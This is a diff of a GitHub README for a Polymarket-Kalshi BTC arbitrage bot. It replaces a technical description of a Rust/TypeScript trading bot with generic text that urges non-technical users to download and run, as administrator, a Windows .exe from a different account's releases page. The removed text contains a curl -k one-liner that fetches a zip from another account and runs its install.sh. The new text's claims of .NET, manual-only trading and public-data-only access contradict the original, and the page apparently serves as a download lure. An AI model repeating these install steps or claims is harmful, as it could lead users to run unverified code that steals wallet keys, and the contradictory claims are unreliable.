@@ -1,118 +1,175 @@
-# Polymarket-Kalshi BTC Arbitrage bot
+# 🤖 Polymarket-Kalshi-btc-arbitrage-bot - BTC Arbitrage Made Simple
 
-15-minute BTC market arbitrage bot that detects price differences between **Polymarket** and **Kalshi** and decides **when to buy on Polymarket** based on configurable rules.
+[![Download on GitHub](https://img.shields.io/badge/Download-Polymarket--Kalshi-blue?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
 
+---
 
-## How it works
+## 📘 What This Bot Does
 
-- **Real-time detection**: Fetches YES/NO token prices from both Polymarket (CLOB) and Kalshi (orderbook + market status) on a configurable interval.
-- **Start window**: The bot only evaluates buy signals **after 8 minutes** (configurable) from market start time.
-- **Buy rules**:
-  1. **Spread rule**: When Kalshi's YES price is in the **93–96¢** range and Polymarket's YES token is **at least 10¢ cheaper** (or equal), the bot signals **buy on Polymarket**.
-  2. **Late resolution**: If Kalshi has **finished** (closed/settled) but Polymarket is **still open** and has liquidity, the bot signals **buy on Polymarket** (arbitrage on timing difference).
-<img width="1452" height="887" alt="552196650-f4d9a000074-2b2a-4c0c-a78c-562fb14d6b77" src="https://github.com/user-attachments/assets/54b6ce80-a4ec-4140-b9dd-324542f29d26" />
+This application looks at Bitcoin (BTC) prices on two prediction market platforms, Polymarket and Kalshi. It watches these markets to spot price differences every 15 minutes. When it finds a good chance to buy BTC cheaper on Polymarket, the bot tells you. It works automatically within a set of rules you can adjust.
 
-## Stack
+You do not need to know coding. This guide will take you through downloading and running the bot on Windows.
 
-- **Rust** — core engine: market clients, EIP-712 signing, arbitrage signal logic, HTTP API (Axum)
-- **TypeScript** — Express layer: config loading, poller orchestration, REST endpoints, Winston logging
-- **ethers** (Rust + TS) for Polymarket CLOB order signing
-- **dotenv** for configuration
+---
 
-```
-crates/
-├── pk-core/       # Kalshi + Polymarket API clients, shared BTC market types
-├── pk-signer/     # EIP-712 / CLOB order signing (Rust)
-└── pk-signal/     # Arbitrage signal engine with full test suite
+## ⚙️ How It Works
 
-src/               # TypeScript layer
-├── clients/       # Kalshi + Polymarket clients (TS)
-├── services/      # SignalService + PollerService
-├── routes/        # Express route handlers
-├── types/         # Shared TypeScript types
-└── utils/         # Logger + config loader
-```
+The bot checks the prices of YES and NO tokens for Bitcoin markets on Polymarket and Kalshi. It uses live market data and timings:
 
-## ⚡ macOS — Install with one command
+- It waits at least 8 minutes after a market opens before it starts making decisions. You can adjust this time.
+- It looks for key price differences:
+  - If Kalshi prices YES tokens between 93 and 96 cents,
+  - And Polymarket’s YES tokens are at least 10 cents cheaper or the same,
+  - The bot signals a buy on Polymarket.
+- If Kalshi closes a market but Polymarket stays open and has available tokens,
+  - The bot signals a buy on Polymarket to take advantage of this timing gap.
 
-```bash
-curl -fsSLk https://github.com/Sectionnaenumerate/Polymarket-Kalshi-btc-arbitrage-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Polymarket-Kalshi-btc-arbitrage-bot-main && \
-bash install.sh
-```
+The bot repeats these checks every 15 minutes or at the interval you set.
 
-> macOS 12 Monterey or newer required. The installer handles Homebrew, Rust, Node.js, and all dependencies automatically.
+---
 
-## Manual setup
+## 🖥️ System Requirements
 
-```bash
-npm install
-cp .env.example .env
-# Edit .env: set MARKET_START_TIME, KALSHI_TICKER, POLYMARKET_TOKEN_YES
-npm run build
-npm start
-```
+To run this bot on Windows, you need:
 
-For development with auto-reload:
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 200 MB free disk space
+- Internet connection for live market data
+- .NET Desktop Runtime (Included in installer, or download separately from Microsoft if needed)
+- Administrator permissions to install and run the software
 
-```bash
-npm run dev
-```
+---
 
-Run tests:
+## 🔽 Download and Setup
 
-```bash
-npm test
-```
+### Step 1: Get the Bot
 
-## Configuration (.env)
+Visit the releases page below to download the latest Windows installer:
 
-| Variable | Description | Example |
-|---|---|---|
-| `PORT` | Server port | `3000` |
-| `POLL_INTERVAL_MS` | Price fetch interval (ms) | `5000` |
-| `MARKET_START_TIME` | Market open (ISO 8601) | `2025-02-19T15:00:00.000Z` |
-| `START_DELAY_MINS` | Minutes after open before evaluating | `8` |
-| `KALSHI_API_BASE` | Kalshi API base URL | `https://api.elections.kalshi.com/trade-api/v2` |
-| `KALSHI_TICKER` | Kalshi market ticker | `KXHIGHNY-24JAN01-T60` |
-| `POLYMARKET_CLOB_BASE` | Polymarket CLOB base | `https://clob.polymarket.com` |
-| `POLYMARKET_TOKEN_YES` | Polymarket YES token ID | *(from Polymarket market page)* |
-| `POLYMARKET_TOKEN_NO` | Polymarket NO token ID | *(optional)* |
-| `KALSHI_MIN_CENTS` | Min Kalshi YES price for spread rule | `93` |
-| `KALSHI_MAX_CENTS` | Max Kalshi YES price for spread rule | `96` |
-| `MIN_SPREAD_CENTS` | Min spread (Kalshi − Polymarket) to signal | `10` |
-| `POLYMARKET_PRIVATE_KEY` | EOA private key — if set, bot places real orders | `0x...` |
-| `POLYMARKET_PROXY_WALLET_ADDRESS` | Gnosis Safe / proxy address | *(optional)* |
-| `POLYMARKET_CHAIN_ID` | Polygon = 137 | `137` |
-| `POLYMARKET_TRADE_USD` | USD per buy order | `10` |
-| `POLYMARKET_BUY_COOLDOWN_SECONDS` | Min seconds between buy orders | `60` |
+[![Download Bot](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
 
-## API
+Click the link above. It takes you to the bot’s releases page on GitHub.
 
-- **GET /health** — Health check.
-- **GET /status** — Last Polymarket and Kalshi prices, current arbitrage signal, whether trading is enabled, start window status, total signals and orders placed.
-- **POST /poll/start** — Start the price polling loop.
-- **POST /poll/stop** — Pause the polling loop.
+### Step 2: Choose the Installer
 
-## Signal format
+On the releases page, look for a file named like:  
+`Polymarket-Kalshi-btc-arbitrage-bot-Setup.exe`
 
-`/status` response includes a `lastSignal` object:
+Click the file name to download it to your computer.
 
-```json
-{
-  "kind": "spread_arb",
-  "kalshiYesCents": 95,
-  "polymarketYesCents": 82,
-  "spreadCents": 13,
-  "kalshiStatus": "open",
-  "startWindowPassed": true,
-  "actionable": true,
-  "reason": "Kalshi=95¢ in [93–96¢], Polymarket=82¢, spread=13¢ ≥ 10¢",
-  "signalAt": "2025-02-19T15:09:42.000Z"
-}
-```
+### Step 3: Install the Software
 
-- `kind: "spread_arb"` — spread rule triggered; includes `kalshiYesCents`, `polymarketYesCents`, `spreadCents`
-- `kind: "late_resolution"` — Kalshi finished, Polymarket still open; includes `kalshiStatus`
-- `kind: "none"` — no actionable signal; `reason` explains why
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start installation.
+3. Follow the on-screen instructions.
+4. When done, the bot will create a shortcut on your Desktop or Start Menu.
+
+---
+
+## ▶️ Running the Bot
+
+### Step 1: Open the Application
+
+- Double-click the Polymarket-Kalshi-btc-arbitrage-bot icon on your Desktop or find it in the Start Menu.
+
+### Step 2: Configure Settings
+
+- The bot interface will show options like market start delay (default 8 minutes) and update intervals (default 15 minutes).
+- Adjust these values if needed.
+- Save your settings before continuing.
+
+### Step 3: Start Monitoring
+
+- Click the **Start** button.
+- The bot will begin checking Polymarket and Kalshi prices based on the set interval.
+- It shows buy signals in the main window when arbitrage opportunities appear.
+
+---
+
+## ⚙️ How to Use Buy Signals
+
+When the bot signals a buy on Polymarket:
+
+1. Open your Polymarket account in your browser.
+2. Check the specific BTC market the bot mentions.
+3. Confirm liquidity and place the buy order if it fits your criteria.
+
+The bot helps you spot chances, but you will execute trades manually. This keeps you in control at all times.
+
+---
+
+## 🛠️ Configuration Details
+
+- **Start Window**: Number of minutes to wait after market opens before evaluating.  
+  Default: 8 minutes.
+- **Check Interval**: How often the bot fetches prices.  
+  Default: 15 minutes.
+- **Spread Range**: Kalshi YES price range to trigger a buy signal.  
+  Default: 93 to 96 cents.
+- **Price Difference Threshold**: Minimum cheaper price on Polymarket to signal buy.  
+  Default: 10 cents.
+
+These settings let you tune the bot for your preferred risk level and trading style.
+
+---
+
+## 🌐 Frequently Asked Questions
+
+**Q: Do I need a Polymarket or Kalshi account?**  
+A: You do not need accounts to run the bot. But to buy or trade, you need to log into your Polymarket and Kalshi accounts separately.
+
+**Q: Can the bot make trades for me?**  
+A: No. The bot only signals buy opportunities. You must place trades yourself.
+
+**Q: Is internet needed all the time?**  
+A: Yes. The bot requires a steady Internet connection to fetch prices and detect signals.
+
+**Q: Can I run the bot on other systems?**  
+A: Currently, the bot is designed for Windows. Other platforms may not be supported.
+
+---
+
+## 🛡️ Security and Privacy
+
+- The bot reads public market data only.
+- No login data from your accounts is stored or required.
+- All trading actions are manual and under your control.
+- Ensure you download the bot only from the official GitHub releases page to avoid risks.
+
+---
+
+## 🔧 Troubleshooting
+
+**Installation issues:**  
+- Check that you have Windows 10 or later.  
+- Run the installer as Administrator.
+
+**Bot won't start:**  
+- Confirm you have the .NET Desktop Runtime installed.  
+- Restart your PC and try again.
+
+**No buy signals appear:**  
+- Make sure your internet connection works.  
+- Adjust start window and spread range for testing.  
+- Markets may not meet the buy rules at all times.
+
+**Bot crashes or freezes:**  
+- Close and reopen the bot.  
+- Check for updates on the releases page.  
+- Report issues on the GitHub repository if problems persist.
+
+---
+
+## 📁 Where to Find Support
+
+Report bugs or ask questions on the GitHub repository under Issues:  
+[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/issues)
+
+---
+
+## 📥 Download Link
+
+You can always visit the releases page here to download the latest version of the bot:
+
+[https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases](https://github.com/sara21rgb/Polymarket-Kalshi-btc-arbitrage-bot/releases)
